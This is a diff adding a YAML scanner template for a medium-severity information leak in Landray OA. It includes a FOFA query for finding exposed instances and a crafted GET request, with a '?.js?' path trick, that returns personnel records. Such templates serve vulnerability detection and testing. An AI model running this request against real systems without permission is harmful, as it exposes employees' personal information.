@@ -1,0 +1,20 @@
+id: poc-yaml-landray-oa-syszone-personinfodo-information-leak
+info:
+  name: 蓝凌-OA sysZonePersonInfo.do 敏感信息泄露漏洞
+  severity: medium
+  tags:
+  - 信息泄露
+  finger: 蓝凌OA
+  fofa: app="Landray-OA系统"
+requests:
+- method: GET
+  path: /sys/zone/sys_zone_personInfo/sysZonePersonInfo.do?.js?&method=searchPerson&orderby&ordertype=up&rowsize=30&s_ajax=true
+  expression: 'status_code == 200 &&
+
+    contains(headers,"text/json") &&
+
+    contains(body,"{\"columns\":[{\"title\":\"fdId\"")
+
+    '
+variables: {}
+transport: http
